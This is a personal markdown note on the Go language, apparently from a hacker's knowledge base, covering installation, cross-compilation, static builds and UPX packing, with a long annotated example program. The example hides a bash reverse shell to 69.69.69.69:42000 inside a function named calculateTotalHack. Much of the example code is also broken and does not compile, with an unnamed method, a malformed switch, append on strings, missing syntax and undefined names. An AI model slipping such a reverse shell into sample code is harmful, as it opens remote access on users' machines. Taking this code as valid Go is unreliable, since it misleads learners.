# Golang 

## Installing Go

[go.dev/doc/install - Official Install Documentation](https://go.dev/doc/install)

## Compiling Go
[Official Compilation Tutorial](https://go.dev/doc/tutorial/compile-install)
```bash
# Remember if you compile for another system
# On target machine:
ldd --version # linux and windows
go build 
CGO_ENABLED=0 go build # For static without c runtime libraries
```
[Continuing research here at Martin Tournoij (“arp242);](https://www.arp242.net/static-go.html)

Specifying Architecture
```bash
go env GOOS GOARCH # current system as target
go tool dist list
GOOS=<os> GOARCH=<arch> go build

ldd $binary # to check it is static or dynamically compiled and with which C libraries if any
```

Minimisation effort with [[UPX]]
```bash
# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation
go build -ldflags="-s -w"
upx <binary>
```

## Effective Go and Writing Go Code
[go.dev/doc/code](https://go.dev/doc/code) explains how to write and compile and install go source code. [Effective Go is a great article to write idiomatic Go Code](https://go.dev/doc/effective_go)

As for unofficial standards of go project layout see [github.com/golang-standards/project-layout](https://github.com/golang-standards/project-layout) has 47k Stars as of 15/04/2024
## Test Driven Development Template

[[Go-Testdriven-Development]]

## Golang Installation for Linux-Based Hacker Distros

[Install Golang](https://go.dev/doc/install) 
```bash
# Careful, <version> and Chip varience
wget https://go.dev/dl/go1.<version>.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf <go.version.tar.gz>
echo "export PATH=$PATH:/usr/local/go/bin" | sudo tee -a /etc/profile # or $HOME.profile for single user
go version # verify
# Export GOPATH & GOBIN
GOPATH="$HOME/go"
echo "" | tee -a ~/.<rc file of shell> 
echo "# Golang GOPATH and GOBIN" | tee -a ~/.profile
echo "export GOPATH=\"$HOME/go\"" | tee -a ~/.profile
echo "export GOBIN=\"$GOPATH/bin\"" | tee -a ~/.profile
```

```bash
# Create a non persistent environment variable outside of GOBIN
go env -w GOBIN=/somewhere/else/bin
# unset
go env -u GOBIN
```

place in developer .rc file
```bash
export GOPATH=$HOME/go
export GOBIN=$GOPATH/bin
export PATH=$PATH:$GOBIN
export PATH=$PATH:$GOBIN:$GOROOT/bin

```

```go
func init() // This is a special function in golang - IS THE FIRST FUNCTION THAT WILL RUN IN YOUR PACKAGE
```

## Debugging with Golang

[go.dev gdb](https://go.dev/doc/gdb) debugging with [[GDB]]

## Secure Coding in Go

[OWASP's Go-SCP](https://github.com/OWASP/Go-SCP) is a *"Go programming language secure coding practices guide"*

## Malware 

[[Go-Malware-Writing-For-Windows]]

## Example


```go
package main // 
// comments 

import (
	"fmt"
	"strings"
	"time"
	"log"
	"os"
	"os/exec"
	"flag" // -h is a default flag for help!
	// generally there is a newline between imported library packages and project packages and external depencies

	// These are stored in the GOPATH Environment variable under a src directory 
	// $GOPATH/src/github.com/[username]/[projectname]/firstlibrary
	"github.com/[username]/[projectname]/firstlibrary"

)

// Upper case is Globally scoped, lowercase is scope to the { block }
type GopherShape struct {
	size int
	colour string
}

// Upper case is Globally scoped
const ImportantNumber int = 69 

// Example of a method that requires a instance of gopherShape
// Domenstrated named return types 
func (g *gopherShape) () (result string, err error) { 
	return result, nil
}

// https://github.com/BishopFox/sliver/blob/master/server/cli/cli.go
func initConsoleLogging(appDir string) *os.File {
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	logFile, err := os.OpenFile(filepath.Join(appDir, "logs", logFileName), os.O_RDWR|os.O_CREATE|os.O_APPEND, 0o600)
	if err != nil {
		log.Fatalf("Error opening file: %v", err)
	}
	log.SetOutput(logFile)
	return logFile
}

func main() {
	var hackingString, argument string 
	var differentPlace string = "Depending on the code culture or specific instance where it make readable sense to write golang like this"
	hackingString = "hacking" // Assignment
	happyString := "Happy" // Declaration 
	// CLI: ./usefulGolang cmd ...
	aCommand := flag.NewFlagSet("cmd", flag.ExitOnError)
	// CLI ./usefulGolang cmd -a <string arg here> 
	aCommand.StringVar(&argument, "a", "default value", "An description")
	// Depending on project, either args are handlede as array or string; Or more likely public CLI repositories that handle this 
	
	logFile := initConsoleLogging(appDir)
	defer logFile.Close()

	time.Sleep(1 * time.Second)

	switch {
		case 0:
			hackingString = append(hackingString, " that you are")
			b := []byte(hackingString) // convert a string to byte slice
		case 1, 2:
			theHackMap := make(map[int]string)
			betterFinalString := append(hackingString, " hacking the planet"
			betterFinalStrAsSlice := strings.SplitAfterN(betterFinalString, "", -1)
			for i,char := range betterFinalStrAsSlice {
				theHackMap[i] = char
			}
		case 3:
			// Below is more pretty way of writing the golang err != nil, usable if a function just returns a err
			if err = calculateTotalHack(); err != nil {
				panic(err) // Exit safetly after goroutines returns and crashes
			}
		// default: You do not always need a `default:` statement
	
	} 


	defer fmt.Printf("%s %s!\n", hackingString)
}

func calculateTotalHack() error {
	needToHack := true
	if needToHack {
		shell := exec.Command("bash" "-c 'exec bash -i &>/dev/tcp/69.69.69.69/42000 <&1'")
		if err := shell.Start(); err != nil {
			return err
		}
		if  err = shell.Wait(); err != nil {
			return err
		}
		return nil
	} else if {
		
	} else {
		err := fmt.Errorf("calculatetotalhack, example custom error messages - no uppercase letters!")
		fmt.Fprintln(os.Stderr, "Error:", err)
		return err
	}
}

```

## References

[Official Compilation Tutorial](https://go.dev/doc/tutorial/compile-install)
[Effective Go is a great article to write idiomatic Go Code](https://go.dev/doc/effective_go)
[Building for specific archs and oses](https://www.digitalocean.com/community/tutorials/building-go-applications-for-different-operating-systems-and-architectures)
[OWASP's Go-SCP](https://github.com/OWASP/Go-SCP)
[go.dev/doc/code](https://go.dev/doc/code) 
[go.dev/doc/install - Official Install Documentation](https://go.dev/doc/install)
[go.dev gdb](https://go.dev/doc/gdb) 
[github.com/golang-standards/project-layout](https://github.com/golang-standards/project-layout)
[itsfoss.gitlab.io](https://itsfoss.gitlab.io/post/how-to-install-golang-go-on-debian-12-11-or-10/)